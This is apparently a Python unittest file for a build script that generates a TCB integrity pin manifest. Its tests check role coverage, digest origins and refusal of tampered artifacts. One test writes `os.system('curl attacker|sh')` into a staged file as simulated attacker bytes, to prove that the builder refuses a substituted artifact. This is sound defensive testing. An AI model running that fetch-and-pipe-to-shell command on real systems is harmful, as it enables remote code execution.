"""The live kit's §2.5 TCB pin manifest must COVER the required set (audit F-10).

`verify_tcb_integrity` refuses an under-specified manifest, because an artifact that is not listed is
never integrity-checked. So the manifest builder falling behind `TCB_REQUIRED_ARTIFACTS` would not be
a silent hole — it would be a hard refusal at every live turn, discovered only on Linux CI. These
tests catch it here instead, and pin the two properties that make the manifest meaningful: every
required role is present, and every entry is a real digest of a real file.
"""

from __future__ import annotations

import contextlib
import hashlib
import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest

TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
if TESTS_DIR not in sys.path:
    sys.path.insert(0, TESTS_DIR)
ENGINE_ROOT = os.path.dirname(TESTS_DIR)
REPO_ROOT = os.path.dirname(ENGINE_ROOT)
# Derived from the engine tree, not from REPO_ROOT/"engine": the builder ships INSIDE
# engine/, so it is present wherever the engine is -- a deployed tree, or a checkout in
# which engine/ is itself the root (engine/.github/workflows/verify.yml runs that way).
# Spelling it REPO_ROOT/engine/... made the two tests that need only the builder depend
# on the engine sitting one level down.
BUILDER = os.path.join(ENGINE_ROOT, "ci", "live", "build_tcb_pin_manifest.py")
TCB_INTEGRITY_RS = os.path.join(
    REPO_ROOT, "apps", "desktop", "src-tauri", "core", "src", "tcb_integrity.rs")

from _prerequisites import DESKTOP_TCB_SOURCE, require, requires  # noqa: E402


def required_artifacts() -> list[str]:
    """The `TCB_REQUIRED_ARTIFACTS` list, read from the Rust source that defines it.

    Read rather than duplicated: a copy here would drift, and a drifted copy would assert that the
    manifest covers a set nobody enforces.
    """
    with open(TCB_INTEGRITY_RS, "r", encoding="utf-8") as f:
        source = f.read()
    body = source.split("pub const TCB_REQUIRED_ARTIFACTS: &[&str] = &[", 1)[1].split("];", 1)[0]
    return re.findall(r'"([^"]+)"', body)


def builder_module():
    """The builder, IMPORTED — for `ROLE_PATHS`, `SOURCE_ORIGIN` and `resolve_roles`.

    It used to be text-parsed: `source.split("SOURCE_ORIGIN = {", 1)[1].split("}", 1)[0]` plus a
    regex over `"k": "v"` pairs. That worked while the map was flat and became wrong the moment it was
    keyed by kit — `split("}", 1)` stops at the end of the FIRST nested kit, so the helper would have
    silently returned one kit's entries and called them all of them. Importing the module cannot be
    wrong about its own shape.
    """
    spec = importlib.util.spec_from_file_location("brops_build_tcb_pin_manifest", BUILDER)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


#: The repo-sourced roles and the source-relative path each is staged from, for ONE kit. Read from the
#: builder rather than copied, so a role moving between "has an origin" and "self-measured" cannot
#: drift past these tests unnoticed.
def source_origin(kit: str = "live") -> dict:
    return dict(builder_module().SOURCE_ORIGIN[kit])


class LiveTcbPinManifestTests(unittest.TestCase):
    def _stage_source(self, root: str, live: str, kit: str = "live") -> str:
        """The tree the kit was staged FROM: a separate directory whose repo-sourced files are
        byte-identical to the installed copies, which is what a clean install produces.

        It is a sibling of the deployment root rather than a subdirectory of it, because a source
        tree living inside the tree it vouches for is not an independent origin.
        """
        source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
        for logical, relative in source_origin(kit).items():
            del logical
            target = os.path.join(source, *relative.split("/"))
            os.makedirs(os.path.dirname(target), exist_ok=True)
            if relative.endswith(("run_live_turn.sh", "run_ladder_turn.sh")):
                # Both `.unit` roles pin a root-owned COPY of the orchestrator, so the source file
                # must carry the unit's bytes.
                payload = "content of " + os.path.basename(self._unit_name(kit))
            else:
                payload = "content of " + os.path.basename(relative)
            with open(target, "w", encoding="utf-8") as f:
                f.write(payload)
        del live
        return source

    @staticmethod
    def _unit_name(kit: str) -> str:
        """The root-owned copy of the orchestrator each kit's two `.unit` roles pin."""
        return {"live": "brops-live.unit", "ladder": "brops-ladder.unit"}[kit]

    def _kit(self, root: str, kit: str = "live") -> tuple[str, str]:
        """Lay out the file set the builder expects for `kit`, with distinguishable contents.

        DERIVED from `ROLE_PATHS[kit]` rather than listed, since 2026-09-21. A hand-written list had to
        be duplicated per kit, and the copy for the second kit would have been the first place the two
        tables drifted. What this deliberately does NOT prove is that a path in the table is the file
        the kit really runs — creating whatever the table names cannot check the table. That is proved
        separately, against each orchestrator's own text, by `KitRoleTableTests`.
        """
        module = builder_module()
        live = os.path.join(root, "engine", "ci", "live")
        sudoers = os.path.join(root, "sudoers")
        unit = os.path.join(root, "tcb", self._unit_name(kit))
        roles = module.resolve_roles(
            kit, tcb=os.path.join(root, "tcb"), live=live, binaries=os.path.join(root, "bin"),
            config=os.path.join(root, "config.json"), sudoers=sudoers, unit=unit)
        for path in sorted(set(roles.values()) | {sudoers, unit}):
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", encoding="utf-8") as f:
                f.write("content of " + os.path.basename(path))
        self._stage_source(root, live, kit)
        return sudoers, unit

    def _run_builder(self, root: str, sudoers: str, unit: str, out: str,
                     source: str | None = None, kit: str = "live",
                     ) -> subprocess.CompletedProcess:
        if source is None:
            source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
        return subprocess.run(
            [sys.executable, BUILDER, "--kit", kit, "--root-dir", root, "--source-dir", source,
             "--sudoers", sudoers, "--unit", unit, "--out", out],
            capture_output=True, text=True)

    def _build(self, root: str, kit: str = "live") -> dict:
        sudoers, unit = self._kit(root, kit)
        out = os.path.join(root, "tcb", "tcb-pin-manifest.json")
        r = self._run_builder(root, sudoers, unit, out, kit=kit)
        self.assertEqual(r.returncode, 0, r.stderr)
        with open(out, "r", encoding="utf-8") as f:
            return json.load(f)

    @requires(DESKTOP_TCB_SOURCE)
    def test_the_manifest_covers_every_required_artifact(self):
        """Cross-tree agreement: engine's builder against the Rust TCB's required set.

        This is an assertion about the SOURCE REPOSITORY -- the required list is read
        from apps/desktop rather than copied, precisely so it cannot drift -- and
        deployment Step 6 copies engine/ alone. Without the Rust source there is no
        required set to compare against, so the test says so by name instead of
        raising FileNotFoundError at a reader four frames down.
        """
        with tempfile.TemporaryDirectory() as root:
            manifest = self._build(root)
            listed = {a["logical_name"] for a in manifest["artifacts"]}
            missing = [name for name in required_artifacts() if name not in listed]
            self.assertEqual(missing, [], "these roles would make verify_tcb_integrity refuse")

    def test_every_pin_is_a_real_digest_of_the_file_it_names(self):
        # A manifest of plausible-looking constants would pass the coverage floor and fail every
        # content check on Linux — worse than no manifest, because it looks like coverage.
        #
        # NOTE what this test does NOT prove, and used to be read as proving: that the digests
        # AGREE with the installed files says nothing about where the digests came from. When every
        # one of them was computed by hashing the file it pinned, this assertion was a tautology.
        # `test_a_substituted_repo_artifact_is_refused_rather_than_pinned` is the one that has
        # teeth.
        with tempfile.TemporaryDirectory() as root:
            manifest = self._build(root)
            for artifact in manifest["artifacts"]:
                with open(artifact["path"], "rb") as f:
                    self.assertEqual(
                        artifact["expected_sha256"], hashlib.sha256(f.read()).hexdigest(),
                        artifact["logical_name"])
                self.assertEqual(artifact["expected_owner"], "root")
            self.assertEqual(manifest["owner_uids"], {"root": 0, "brops_admin": 0})

    def test_every_pin_declares_where_its_digest_came_from(self):
        # The §2.5 floor is a content pin, and a content pin is only as good as the ORIGIN of the
        # number. The manifest has to be readable as which-is-which, or an auditor cannot tell a
        # pin from the tree measuring itself.
        with tempfile.TemporaryDirectory() as root:
            manifest = self._build(root)
            origins = source_origin()
            self.assertTrue(origins, "the builder declares no repo-sourced artifact at all")
            independent = 0
            for artifact in manifest["artifacts"]:
                origin = artifact["digest_origin"]
                if artifact["logical_name"] in origins:
                    self.assertEqual(
                        origin, "source:" + origins[artifact["logical_name"]],
                        artifact["logical_name"])
                    independent += 1
                else:
                    self.assertEqual(origin, "deployment-measured", artifact["logical_name"])
            self.assertEqual(manifest["digest_origin_counts"]["source"], independent)
            self.assertEqual(
                manifest["digest_origin_counts"]["deployment-measured"],
                len(manifest["artifacts"]) - independent)
            self.assertGreater(independent, 0)

    def test_a_substituted_repo_artifact_is_refused_rather_than_pinned(self):
        # THE reproduction. Every `expected_sha256` used to be computed by hashing the very file it
        # pinned, in the same root shell that had installed it — so an artifact substituted BEFORE
        # the pin was taken was pinned at its substituted digest and the later §2.5 check verified
        # it happily. Driven against the old builder this returned 0 and emitted a manifest whose
        # supervisor pin WAS the attacker's bytes.
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            victim = os.path.join(root, "engine", "ci", "live", "run_supervisor.py")
            with open(victim, "w", encoding="utf-8") as f:
                f.write("import os; os.system('curl attacker|sh')")
            out = os.path.join(root, "m.json")
            r = self._run_builder(root, sudoers, unit, out)
            self.assertNotEqual(r.returncode, 0, r.stdout)
            self.assertIn("supervisor.bin", r.stderr)
            self.assertIn("the source it was staged from", r.stderr)
            self.assertFalse(os.path.exists(out), "a refused build must emit no manifest")

    def test_a_missing_source_origin_is_refused_not_self_measured(self):
        # The failure mode the required argument exists to prevent: falling back to hashing the
        # deployment copy when the origin cannot be found is exactly the defect, quietly restored.
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
            os.remove(os.path.join(source, "engine", "ci", "live", "run_signer.py"))
            out = os.path.join(root, "m.json")
            r = self._run_builder(root, sudoers, unit, out)
            self.assertNotEqual(r.returncode, 0, r.stdout)
            self.assertIn("isolated-signer.bin", r.stderr)
            self.assertFalse(os.path.exists(out))

    def test_the_builder_refuses_without_a_source_tree(self):
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            out = os.path.join(root, "m.json")
            r = self._run_builder(root, sudoers, unit, out,
                                  source=os.path.join(root, "does-not-exist"))
            self.assertNotEqual(r.returncode, 0, r.stdout)
            self.assertIn("--source-dir", r.stderr)
            self.assertFalse(os.path.exists(out))

    def test_a_manifest_with_no_independent_digest_at_all_is_refused(self):
        # If `SOURCE_ORIGIN` were ever emptied, every pin would go back to being the tree hashing
        # itself and every test above would still pass — the roles would simply all be
        # "deployment-measured". This is the guard that makes that state a refusal instead of a
        # silent return to the defect, so it is driven with the map emptied.
        module = builder_module()
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            source = os.path.join(os.path.dirname(os.path.normpath(root)), "source-tree")
            out = os.path.join(root, "m.json")
            argv = [BUILDER, "--kit", "live", "--root-dir", root, "--source-dir", source,
                    "--sudoers", sudoers, "--unit", unit, "--out", out]
            # The KIT's map, emptied — not the whole per-kit dict, which would raise `KeyError` and
            # test the lookup rather than the refusal.
            saved_map, saved_argv = module.SOURCE_ORIGIN["live"], sys.argv
            stderr = io.StringIO()
            try:
                module.SOURCE_ORIGIN["live"] = {}
                sys.argv = argv
                with contextlib.redirect_stderr(stderr), contextlib.redirect_stdout(io.StringIO()):
                    rc = module.main()
            finally:
                module.SOURCE_ORIGIN["live"], sys.argv = saved_map, saved_argv
            self.assertEqual(rc, 1)
            self.assertIn("not one pinned digest has an origin outside", stderr.getvalue())
            self.assertFalse(os.path.exists(out))

    def test_the_live_kit_passes_the_source_tree_to_the_builder(self):
        # A required argument nothing passes is a kit that cannot provision, discovered on Linux
        # CI. Assert the wiring here, where the message is about the wiring.
        kit = os.path.join(ENGINE_ROOT, "ci", "live", "run_live_turn.sh")
        with open(kit, "r", encoding="utf-8") as f:
            script = f.read()
        invocation = [line for line in script.splitlines()
                      if "build_tcb_pin_manifest.py" in line and line.startswith("python3")]
        self.assertEqual(len(invocation), 1, invocation)
        self.assertIn('--source-dir "$REPO_ROOT"', invocation[0])

    def test_the_ladder_kit_builds_a_manifest_that_covers_the_required_set(self):
        require(DESKTOP_TCB_SOURCE)
        with tempfile.TemporaryDirectory() as root:
            manifest = self._build(root, "ladder")
        pinned = sorted(a["logical_name"] for a in manifest["artifacts"])
        self.assertEqual(pinned, sorted(required_artifacts()))

    def test_a_missing_artifact_fails_the_build_instead_of_being_skipped(self):
        with tempfile.TemporaryDirectory() as root:
            sudoers, unit = self._kit(root)
            os.remove(os.path.join(root, "tcb", "root-anchor.json"))
            r = self._run_builder(root, sudoers, unit, os.path.join(root, "m.json"))
            self.assertNotEqual(r.returncode, 0)
            self.assertIn("key-manifest.root-anchor", r.stderr)


#: kit -> the orchestrator whose text decides that kit's role table.
ORCHESTRATOR = {
    "live": os.path.join(ENGINE_ROOT, "ci", "live", "run_live_turn.sh"),
    "ladder": os.path.join(ENGINE_ROOT, "ci", "live", "run_ladder_turn.sh"),
}

#: The `live` role table as it stood before the tables were keyed by kit, as PATHS RELATIVE to the
#: deployment root. Frozen here on purpose: the per-kit refactor had to leave this kit's manifest
#: byte-identical, and the only way to know it did is an expectation written down by hand and read by
#: a person, not one derived from the code it is checking.
LIVE_ROLES_BEFORE_THE_SPLIT = {
    "supervisor.bin": "engine/ci/live/run_supervisor.py",
    "evidence-recorder-runner.bin": "bin/governed_recorder",
    "privileged-launcher.bin": "tcb/privileged-launcher.bin",
    "contained-executor.bin": "tcb/contained-executor.bin",
    "isolated-signer.bin": "engine/ci/live/run_signer.py",
    "trusted-verifier-broker.bin": "bin/live_turn",
    "desktop-challenge-authority.bin": "engine/ci/live/run_authority.py",
    "supervisor.config": "config.json",
    "evidence-recorder-runner.config": "tcb/recorder-policy.json",
    "privileged-launcher.config": "tcb/executor.lease",
    "contained-executor.config": "tcb/executor.lease",
    "isolated-signer.config": "config.json",
    "trusted-verifier-broker.config": "config.json",
    "desktop-challenge-authority.config": "config.json",
    "desktop-challenge-authority.ipc-policy": "tcb/desktop-challenge-authority.ipc-policy.json",
    "trusted-verifier-broker.ipc-policy": "tcb/trusted-verifier-broker.ipc-policy.json",
    "trusted-verifier-broker.pinned-manifest-config": "config.json",
    "governed-execution-allowlist.source": "<sudoers>",
    "key-manifest.root-anchor": "tcb/root-anchor.json",
    "trusted-verifier-broker.unit": "<unit>",
    "desktop-challenge-authority.unit": "<unit>",
}


class KitRoleTableTests(unittest.TestCase):
    """The tables themselves, and the thing `_kit()` deliberately cannot check.

    `_kit()` creates whatever `ROLE_PATHS[kit]` names, so every build test would pass over a table
    that pointed at the wrong file. What makes a table CORRECT is that each role names the file the
    kit really runs, and the only independent witness of that is the orchestrator's own text. That is
    what this class reads.

    Until 2026-09-21 there was one table, written for `run_live_turn.sh`, and
    `run_ladder_turn.sh`'s banner said what that meant for the ladder kit: a manifest built there
    "would measure files that are not the ones serving this turn."
    """

    def roles(self, kit: str) -> dict:
        """`{logical_name: path relative to the deployment root}`, with the two argv-supplied paths
        rendered as `<sudoers>` / `<unit>` so a table can be compared without a real layout."""
        resolved = builder_module().resolve_roles(
            kit, tcb="/R/tcb", live="/R/engine/ci/live", binaries="/R/bin",
            config="/R/config.json", sudoers="<sudoers>", unit="<unit>")
        return {name: (path if path.startswith("<") else path[len("/R/"):])
                for name, path in resolved.items()}

    def orchestrator_front_doors(self, kit: str) -> set:
        """The `run_*.py` front doors that kit's orchestrator actually starts."""
        with open(ORCHESTRATOR[kit], "r", encoding="utf-8") as f:
            lines = f.read().splitlines()
        started = [l for l in lines if re.match(r"\s*start_(server|service)\s+\"\$", l)]
        self.assertEqual(len(started), 3, "expected three service starts in %s: %s"
                         % (ORCHESTRATOR[kit], started))
        found = set()
        for line in started:
            found.update(re.findall(r"(run_[a-z_]+\.py)", line))
        return found

    # ---- coverage, per kit --------------------------------------------------------------------

    @requires(DESKTOP_TCB_SOURCE)
    def test_every_kit_covers_the_required_set_exactly(self):
        roster = sorted(required_artifacts())
        for kit in builder_module().KITS:
            with self.subTest(kit=kit):
                self.assertEqual(sorted(self.roles(kit)), roster,
                                 "kit %r does not name exactly the rev-30 roster" % kit)

    def test_there_are_two_kits_and_they_are_the_two_orchestrators(self):
        self.assertEqual(builder_module().KITS, ("ladder", "live"))
        self.assertEqual(sorted(ORCHESTRATOR), ["ladder", "live"])

    # ---- the live table did not move ----------------------------------------------------------

    def test_the_live_table_is_what_it_was_before_the_split(self):
        """Mutant: change any `live` row ⇒ this fails. The refactor's whole safety claim is that the
        §5 kit's manifest is unchanged, and a claim nothing checks is a hope."""
        self.assertEqual(self.roles("live"), LIVE_ROLES_BEFORE_THE_SPLIT)

    # ---- the ladder table names what the ladder kit runs ---------------------------------------

    def test_each_kits_three_python_front_doors_are_the_ones_it_starts(self):
        """THE assertion this class exists for. The three `*.bin` roles that point into the staged
        Python tree must be exactly the three scripts the orchestrator launches — which is the
        property the single hardcoded table broke for the ladder kit."""
        for kit in ("live", "ladder"):
            with self.subTest(kit=kit):
                roles = self.roles(kit)
                named = {os.path.basename(roles[r]) for r in
                         ("supervisor.bin", "isolated-signer.bin", "desktop-challenge-authority.bin")}
                self.assertEqual(named, self.orchestrator_front_doors(kit))

    def test_the_ladder_supervisor_is_not_the_section_5_one(self):
        """Stated as its own test because it is the defect in one line: `run_supervisor.py` is not
        running on the ladder kit at all, and pinning it measured a file nothing served from."""
        self.assertEqual(os.path.basename(self.roles("ladder")["supervisor.bin"]),
                         "run_ladder_supervisor.py")
        self.assertEqual(os.path.basename(self.roles("live")["supervisor.bin"]),
                         "run_supervisor.py")

    def test_each_kits_unit_roles_pin_its_OWN_orchestrator(self):
        module = builder_module()
        for kit, script in (("live", "run_live_turn.sh"), ("ladder", "run_ladder_turn.sh")):
            with self.subTest(kit=kit):
                origins = module.SOURCE_ORIGIN[kit]
                for role in ("trusted-verifier-broker.unit", "desktop-challenge-authority.unit"):
                    self.assertTrue(origins[role].endswith(script),
                                    "%s/%s -> %s" % (kit, role, origins[role]))

    def test_the_broker_side_binary_is_each_kits_own_driver(self):
        self.assertEqual(self.roles("live")["trusted-verifier-broker.bin"], "bin/live_turn")
        self.assertEqual(self.roles("ladder")["trusted-verifier-broker.bin"], "bin/ladder_turn")

    def test_the_ladder_supervisor_config_pins_the_document_nothing_else_pins(self):
        """`run_ladder_supervisor.py` is started with `--config config.json --ladder tcb/ladder.json`.
        `config.json` is pinned under three other roles either way; `ladder.json` is pinned by nothing
        else and carries this kit's registry, turn and socket steering."""
        roles = self.roles("ladder")
        self.assertEqual(roles["supervisor.config"], "tcb/ladder.json")
        self.assertEqual(sum(1 for p in roles.values() if p == "config.json"), 4)

    # ---- the source-origin maps point at real repository files ---------------------------------

    def test_every_source_origin_path_is_a_real_file_in_this_repository(self):
        """A `source:` origin that does not resolve is the one failure mode that turns a real content
        pin back into self-measurement — and the builder only discovers it on a deployment host."""
        module = builder_module()
        for kit, origins in module.SOURCE_ORIGIN.items():
            for role, relative in origins.items():
                with self.subTest(kit=kit, role=role):
                    self.assertTrue(os.path.isfile(os.path.join(REPO_ROOT, *relative.split("/"))),
                                    "%s/%s -> %s is not a file" % (kit, role, relative))

    def test_a_source_origin_role_is_a_role_the_kit_actually_has(self):
        module = builder_module()
        for kit, origins in module.SOURCE_ORIGIN.items():
            with self.subTest(kit=kit):
                self.assertEqual(sorted(set(origins) - set(module.ROLE_PATHS[kit])), [])

    # ---- the flag itself ----------------------------------------------------------------------

    def test_the_kit_flag_has_no_default(self):
        done = subprocess.run([sys.executable, BUILDER, "--root-dir", ".", "--source-dir", ".",
                               "--sudoers", "s", "--unit", "u", "--out", "o"],
                              capture_output=True, text=True)
        self.assertEqual(done.returncode, 2)
        self.assertIn("--kit", done.stderr)

    def test_an_unknown_kit_is_refused_rather_than_guessed(self):
        done = subprocess.run([sys.executable, BUILDER, "--kit", "wishes", "--root-dir", ".",
                               "--source-dir", ".", "--sudoers", "s", "--unit", "u", "--out", "o"],
                              capture_output=True, text=True)
        self.assertEqual(done.returncode, 2)
        self.assertIn("wishes", done.stderr)

    def test_the_live_kit_names_its_kit_at_the_call_site(self):
        with open(ORCHESTRATOR["live"], "r", encoding="utf-8") as f:
            invocation = [l for l in f.read().splitlines()
                          if "build_tcb_pin_manifest.py" in l and l.startswith("python3")]
        self.assertEqual(len(invocation), 1, invocation)
        self.assertIn("--kit live", invocation[0])

    def test_the_ladder_kit_states_why_it_does_not_build_one(self):
        """It does not call the builder, and that is now an ORDERING obstacle rather than a naming
        one. The banner has to say which, or the next reader re-derives the role table that already
        exists."""
        with open(ORCHESTRATOR["ladder"], "r", encoding="utf-8") as f:
            script = f.read()
        self.assertNotIn("python3 \"$PYLIVE/build_tcb_pin_manifest.py\"", script)
        self.assertIn("--kit ladder", script)
        self.assertIn("ORDERING, not naming", script)


if __name__ == "__main__":
    unittest.main()
